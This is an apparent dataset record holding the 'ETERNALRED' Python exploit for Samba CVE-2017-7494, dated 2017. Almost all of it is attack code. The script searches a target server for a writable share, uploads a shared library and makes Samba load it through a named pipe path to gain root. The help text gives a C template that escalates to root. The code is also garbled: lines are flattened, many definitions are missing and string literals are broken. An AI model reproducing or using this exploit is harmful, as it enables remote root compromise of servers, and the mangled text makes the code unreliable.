{
    "text": "vul_name : Samba 3.5.0 Remote Code Execution ， vul_cve : CVE-2017-7494 ， vul_poc :  #  ! /usr/bin/env python ，  # Title : ETERNALRED ，  # Date : 05/24/2017 ，  # Exploit Author : steelo <knownsteelo @ gmail.com> ，  # Vendor Homepage :  ，  # Samba 3.5.0 - 4.5.4/4.5.10/4.4.14 ，  # CVE-2017-7494 ， from smb.SMBConnection import SMBConnection ， from smb import smb_structs ， from smb.base import _PendingRequest ， from smb.smb2_structs import *  ， from smb.base import *  ， class SharedDevice2 ( SharedDevice )  :  ， super (  ) ._init_ ( type , name , comments )  ， self.path = path ， self.password = password ， class SMBConnectionEx ( SMBConnection )  :  ， super (  ) ._init_ ( username , password , my_name , remote_name , domain , use_ntlm_v2 , sign_options , is_direct_tcp )  ， self._listShares = self.listSharesEx ， self._retrieveFileFromOffset = self._retrieveFileFromOffset_SMB1Unix ，  # This is maily the original listShares but request a higher level of info ， raise NotReadyError ( 'SMB connection not authenticated' )  ， expiry_time = time.time (  ) + timeout ， path = 'IPC $ ' ， messages_history = [  ]  ， m = SMB2Message ( SMB2CreateRequest ( 'srvsvc' ,  ， file_attributes = 0 ,  ， access_mask = FILE_READ_DATA | FILE_WRITE_DATA | FILE_APPEND_DATA | FILE_READ_EA | FILE_WRITE_EA | READ_CONTROL | FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE ,  ， share_access = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE ,  ， oplock = SMB2_OPLOCK_LEVEL_NONE ,  ， impersonation = SEC_IMPERSONATE ,  ， create_options = FILE_NON_DIRECTORY_FILE | FILE_OPEN_NO_RECALL ,  ， create_disp = FILE_OPEN )  ， m.tid = tid ， self._sendSMBMessage ( m )  ， self.pending_requests [ m.mid ] = _PendingRequest ( m.mid , expiry_time , connectSrvSvcCB , errback )  ， messages_history.append ( m )  ， messages_history.append ( create_message )  ， call_id = self._getNextRPCCallID (  )  ，  # The data_bytes are binding call to Server Service RPC using DCE v1.1 RPC over SMB. See [ MS-SRVS ] and [ C706 ]  ，  # If you wish to understand the meanings of the byte stream , I would suggest you use a recent version of WireShark to packet capture the stream ， data_bytes = \\ ， binascii.unhexlify ( b\"05 00 0b 03 10 00 00 00 74 00 00 00\".replace ( b' ' , b' ) + \\ ， struct.pack ( '<I' , call_id ) + \\ ， binascii.unhexlify ( b\" ， b8 10 b8 10 00 00 00 00 02 00 00 00 00 00 01 00 ， c8 4f 32 4b 70 16 d3 01 12 78 5a 47 bf 6e e1 88 ， 03 00 00 00 04 5d 88 8a eb 1c c9 11 9f e8 08 00 ， 2b 10 48 60 02 00 00 00 01 00 01 00 c8 4f 32 4b ， 70 16 d3 01 12 78 5a 47 bf 6e e1 88 03 00 00 00 ， 2c 1c b7 6c 12 98 40 45 03 00 00 00 00 00 00 00 ， 01 00 00 00 ， \".replace ( b' ' , b' ) .replace ( b'\\n' , b' )  ， m = SMB2Message ( SMB2WriteRequest ( create_message.payload.fid , data_bytes , 0 )  ， m.tid = create_message.tid ， self._sendSMBMessage ( m )  ， self.pending_requests [ m.mid ] = _PendingRequest ( m.mid , expiry_time , rpcBindCB , errback , fid = create_message.payload.fid )  ， messages_history.append ( m )  ， errback ( OperationFailure ( 'Failed to list shares : Unable to locate Server Service RPC endpoint' , messages_history )  ， messages_history.append ( trans_message )  ， m = SMB2Message ( SMB2ReadRequest ( kwargs [ 'fid' ]  , read_len = 1024 , read_offset = 0 )  ， m.tid = trans_message.tid ， self._sendSMBMessage ( m )  ， self.pending_requests [ m.mid ] = _PendingRequest ( m.mid , expiry_time , rpcReadCB , errback , fid = kwargs [ 'fid' ]  )  ， messages_history.append ( m )  ， closeFid ( trans_message.tid , kwargs [ 'fid' ]  , error = 'Failed to list shares : Unable to read from Server Service RPC endpoint' )  ， messages_history.append ( read_message )  ， call_id = self._getNextRPCCallID (  )  ， padding = b' ， remote_name = '\\' + self.remote_name ， server_len = len ( remote_name ) + 1 ， server_bytes_len = server_len * 2 ， padding = b'\\0\\0' ， server_bytes_len += 2 ，  # The data bytes are the RPC call to NetrShareEnum ( Opnum 15 ) at Server Service RPC. ，  # If you wish to understand the meanings of the byte stream , I would suggest you use a recent version of WireShark to packet capture the stream ， data_bytes = \\ ， binascii.unhexlify ( b\"05 00 00 03 10 00 00 00\".replace ( b' ' , b' ) + \\ ， struct.pack ( '<HHI' , 72+server_bytes_len , 0 , call_id ) + \\ ， binascii.unhexlify ( b\"4c 00 00 00 00 00 0f 00 00 00 02 00\".replace ( b' ' , b' ) + \\ ， struct.pack ( '<III' , server_len , 0 , server_len ) + \\ ，  ( remote_name + '\\0' ) .encode ( 'UTF-16LE' ) + padding + \\ ， binascii.unhexlify ( b\" ， 02 00 00 00 02 00 00 00 04 00 02 00 00 00 00 00 ， 00 00 00 00 ff ff ff ff 00 00 00 00 00 00 00 00 ， \".replace ( b' ' , b' ) .replace ( b'\\n' , b' )  ， m = SMB2Message ( SMB2IoctlRequest ( kwargs [ 'fid' ]  , 0x0011C017 , flags = 0x01 , max_out_size = 8196 , in_data = data_bytes )  ， m.tid = read_message.tid ， self._sendSMBMessage ( m )  ， self.pending_requests [ m.mid ] = _PendingRequest ( m.mid , expiry_time , listShareResultsCB , errback , fid = kwargs [ 'fid' ]  )  ， messages_history.append ( m )  ， closeFid ( read_message.tid , kwargs [ 'fid' ]  , error = 'Failed to list shares : Unable to bind to Server Service RPC endpoint' )  ， messages_history.append ( result_message )  ，  # The payload.data_bytes will contain the results of the RPC call to NetrShareEnum ( Opnum 15 ) at Server Service RPC. ， data_bytes = result_message.payload.out_data ， sendReadRequest ( result_message.tid , kwargs [ 'fid' ]  , data_bytes )  ， decodeResults ( result_message.tid , kwargs [ 'fid' ]  , data_bytes )  ， elif result_message.status = 0x0103 :  # STATUS_PENDING ， self.pending_requests [ result_message.mid ] = _PendingRequest ( result_message.mid , expiry_time , listShareResultsCB , errback , fid = kwargs [ 'fid' ]  )  ， closeFid ( result_message.tid , kwargs [ 'fid' ]  )  ， errback ( OperationFailure ( 'Failed to list shares : Unable to retrieve shared device list' , messages_history )  ， shares_count = struct.unpack ( '<I' , data_bytes [ 36 : 40 ]  )  [ 0 ]  ， results = [  ]  # A list of SharedDevice2 instances ， offset = 36 + 52 # You need to study the byte stream to understand the meaning of these constants ， results.append ( SharedDevice ( struct.unpack ( '<I' , data_bytes [ offset+4 : offset+8 ]  )  [ 0 ]  , None , None )  ， offset += 12 ， max_length , _ , length = struct.unpack ( '<III' , data_bytes [ offset : offset+12 ]  )  ， offset += 12 ， results [ i ] .name = data_bytes [ offset : offset+length * 2-2 ] .decode ( 'UTF-16LE' )  ， offset += ( length * 2 + 2 )  ， offset += ( length * 2 )  ， max_length , _ , length = struct.unpack ( '<III' , data_bytes [ offset : offset+12 ]  )  ， offset += 12 ， results [ i ] .comments = data_bytes [ offset : offset+length * 2-2 ] .decode ( 'UTF-16LE' )  ， offset += ( length * 2 + 2 )  ， offset += ( length * 2 )  ， max_length , _ , length = struct.unpack ( '<III' , data_bytes [ offset : offset+12 ]  )  ， offset += 12 ， results [ i ] .path = data_bytes [ offset : offset+length * 2-2 ] .decode ( 'UTF-16LE' )  ， offset += ( length * 2 + 2 )  ， offset += ( length * 2 )  ， max_length , _ , length = struct.unpack ( '<III' , data_bytes [ offset : offset+12 ]  )  ， offset += 12 ， results [ i ] .password = data_bytes [ offset : offset+length * 2-2 ] .decode ( 'UTF-16LE' )  ， offset += ( length * 2 + 2 )  ， offset += ( length * 2 )  ， closeFid ( tid , fid )  ， callback ( results )  ， read_count = min ( 4280 , self.max_read_size )  ， m = SMB2Message ( SMB2ReadRequest ( fid , 0 , read_count )  ， m.tid = tid ， self._sendSMBMessage ( m )  ， self.pending_requests [ m.mid ] = _PendingRequest ( m.mid , int ( time.time (  ) + timeout , readCB , errback ,  ， fid = fid , data_bytes = data_bytes )  ， messages_history.append ( read_message )  ， data_len = read_message.payload.data_length ， data_bytes = read_message.payload.data ， sendReadRequest ( read_message.tid , kwargs [ 'fid' ]  , kwargs [ 'data_bytes' ] + data_bytes [ 24 : data_len-24 ]  )  ， decodeResults ( read_message.tid , kwargs [ 'fid' ]  , kwargs [ 'data_bytes' ] + data_bytes [ 24 : data_len-24 ]  )  ， closeFid ( read_message.tid , kwargs [ 'fid' ]  )  ， errback ( OperationFailure ( 'Failed to list shares : Unable to retrieve shared device list' , messages_history )  ， m = SMB2Message ( SMB2CloseRequest ( fid )  ， m.tid = tid ， self._sendSMBMessage ( m )  ， self.pending_requests [ m.mid ] = _PendingRequest ( m.mid , expiry_time , closeCB , errback , results = results , error = error )  ， messages_history.append ( m )  ， callback ( kwargs [ 'results' ]  )  ， elif kwargs [ 'error' ] is not None :  ， errback ( OperationFailure ( kwargs [ 'error' ]  , messages_history )  ， messages_history.append ( connect_message )  ， self.connected_trees [ path ] = connect_message.tid ， connectSrvSvc ( connect_message.tid )  ， errback ( OperationFailure ( 'Failed to list shares : Unable to connect to IPC $ ' , messages_history )  ， m = SMB2Message ( SMB2TreeConnectRequest ( r'\\%s\\%s' % ( self.remote_name.upper (  )  , path )  ， self._sendSMBMessage ( m )  ， self.pending_requests [ m.mid ] = _PendingRequest ( m.mid , expiry_time , connectCB , errback , path = path )  ， messages_history.append ( m )  ， connectSrvSvc ( self.connected_trees [ path ]  )  ，  # Don't convert to Window style path ， raise NotReadyError ( 'SMB connection not authenticated' )  ， messages_history = [  ]  ， m = SMBMessage ( ComOpenAndxRequest ( filename = path ,  ， access_mode = 0x0040 ,  # Sharing mode : Deny nothing to others ， open_mode = 0x0001 ,  # Failed if file does not exist ， search_attributes = SMB_FILE_ATTRIBUTE_HIDDEN | SMB_FILE_ATTRIBUTE_SYSTEM ,  ， timeout = timeout * 1000 )  ， m.tid = tid ， self._sendSMBMessage ( m )  ， self.pending_requests [ m.mid ] = _PendingRequest ( m.mid , int ( time.time (  ) + timeout , openCB , errback )  ， messages_history.append ( m )  ， messages_history.append ( open_message )  ， closeFid ( open_message.tid , open_message.payload.fid )  ， callback ( file_obj , open_message.payload.file_attributes , 0 )  ， sendRead ( open_message.tid , open_message.payload.fid , starting_offset , open_message.payload.file_attributes , 0 , max_length )  ， errback ( OperationFailure ( 'Failed to retrieve %s on %s : Unable to open file' % ( path , service_name )  , messages_history )  ， read_count = self.max_raw_size - 2 ， m = SMBMessage ( ComReadAndxRequest ( fid = fid ,  ， offset = offset ,  ， max_return_bytes_count = read_count ,  ， min_return_bytes_count = min ( 0xFFFF , read_count )  ， m.tid = tid ， self._sendSMBMessage ( m )  ， self.pending_requests [ m.mid ] = _PendingRequest ( m.mid , int ( time.time (  ) + timeout , readCB , errback , fid = fid , offset = offset , file_attributes = file_attributes ,  ， read_len = read_len , remaining_len = remaining_len )  ，  # To avoid crazy memory usage when retrieving large files , we do not save every read_message in messages_history. ， read_len = kwargs [ 'read_len' ]  ， remaining_len = kwargs [ 'remaining_len' ]  ， data_len = read_message.payload.data_length ， file_obj.write ( read_message.payload.data [  : remaining_len ]  )  ， read_len += remaining_len ， remaining_len = 0 ， file_obj.write ( read_message.payload.data )  ， remaining_len -= data_len ， read_len += data_len ， file_obj.write ( read_message.payload.data )  ， read_len += data_len ， closeFid ( read_message.tid , kwargs [ 'fid' ]  )  ， callback ( file_obj , kwargs [ 'file_attributes' ]  , read_len )  # Note that this is a tuple of 3-elements ， sendRead ( read_message.tid , kwargs [ 'fid' ]  , kwargs [ 'offset' ] +data_len , kwargs [ 'file_attributes' ]  , read_len , remaining_len )  ， messages_history.append ( read_message )  ， closeFid ( read_message.tid , kwargs [ 'fid' ]  )  ， errback ( OperationFailure ( 'Failed to retrieve %s on %s : Read failed' % ( path , service_name )  , messages_history )  ， m = SMBMessage ( ComCloseRequest ( fid )  ， m.tid = tid ， self._sendSMBMessage ( m )  ， messages_history.append ( m )  ， messages_history.append ( connect_message )  ， self.connected_trees [ service_name ] = connect_message.tid ， sendOpen ( connect_message.tid )  ， errback ( OperationFailure ( 'Failed to retrieve %s on %s : Unable to connect to shared device' % ( path , service_name )  , messages_history )  ， m = SMBMessage ( ComTreeConnectAndxRequest ( r'\\%s\\%s' % ( self.remote_name.upper (  )  , service_name )  , SERVICE_ANY , ' )  ， self._sendSMBMessage ( m )  ， self.pending_requests [ m.mid ] = _PendingRequest ( m.mid , int ( time.time (  ) + timeout , connectCB , errback , path = service_name )  ， messages_history.append ( m )  ， sendOpen ( self.connected_trees [ service_name ]  )  ， smb_structs.SUPPORT_SMB2 = False ， conn = SMBConnectionEx ( user , password , \" , \"server\" )  ， assert conn.connect ( server , port )  ， conn.hook_listShares (  )  ， print ( \" [ + ] Searching for writable share\" )  ， filename = \"red\" ， test_file = tempfile.TemporaryFile (  )  ，  # If it's not writeable this will throw ， conn.storeFile ( share.name , filename , test_file )  ， conn.deleteFiles ( share.name , filename )  ， print ( \" [ + ] Found writeable share : \" + share.name )  ， pass ， with open ( payload , \"rb\" ) as fin :  ， conn.storeFile ( share.name , payload_name , fin )  ， path = share.path [ 2 :  ]  ， path = path.replace ( \"\\\" , \"/\" )  ， conn = get_connection ( user , password , server , port , force_smb1 = True )  ， conn.hook_retrieveFile (  )  ， print ( \" [ + ] Attempting to load payload\" )  ， temp_file = tempfile.TemporaryFile (  )  ， conn.retrieveFile ( \"IPC $ \" , \"\\PIPE\\\" + fullpath , temp_file )  ， pass ， payload_name = \"charizard\" ， conn = get_connection ( user , password , server , port )  ， shares = get_share_info ( conn )  ， share = find_writeable_share ( conn , shares )  ， print ( \" [  !  ] No writeable shares on \" + server + \" for user : \" + user )  ， sys.exit ( -1 )  ， print ( \" [  !  ] Failed to write payload : \" + str ( payload ) + \" to server\" )  ， sys.exit ( -1 )  ， conn.close (  )  ， fullpath = convert_share_path ( share )  ， parser = argparse.ArgumentParser ( formatter_class=argparse.RawDescriptionHelpFormatter ,  ， description= \"Eternal Red Samba Exploit - CVE-2017-7494 ， Causes vulnerable Samba server to load a shared library in root context ， Credentials are not required if the server has a guest account ， For remote exploit you must have write permissions to at least one share ， Eternal Red will scan the Samba server for shares it can write to ， It will also determine the fullpath of the remote share ， For local exploit provide the full path to your shared library to load ， Your shared library should look something like this ， extern bool change_to_root_user ( void )  ;  ， int samba_init_module ( void )  ， { ， change_to_root_user (  )  ;  ， / * Do what thou wilt * / ， } ， \" )  ， parser.add_argument ( \"payload\" , help=\"path to shared library to load\" , type=str )  ， parser.add_argument ( \"server\" , help=\"Server to target\" , type=str )  ， parser.add_argument ( \"-p\" , \"-port\" , help=\"Port to use defaults to 445\" , type=int )  ， parser.add_argument ( \"-u\" , \"-username\" , help=\"Username to connect as defaults to nobody\" , type=str )  ， parser.add_argument ( \"-password\" , help=\"Password for user default is empty\" , type=str )  ， parser.add_argument ( \"-local\" , help=\"Perform local attack. Payload should be fullpath ! \" , type=bool )  ， args = parser.parse_args (  )  ， print ( \" [  !  ] Unable to open : \" + args.payload )  ， sys.exit ( -1 )  ， port = 445 ， user = \"nobody\" ， password = \" ， fullpath = \" ， port = args.port ， user = args.username ， password = args.password ， fullpath = args.payload ， fullpath = drop_payload ( user , password , args.server , port , args.payload )  ， load_payload ( user , password , args.server , port , fullpath )  ， main (  ) ",
    "time": "2017.05.26"
}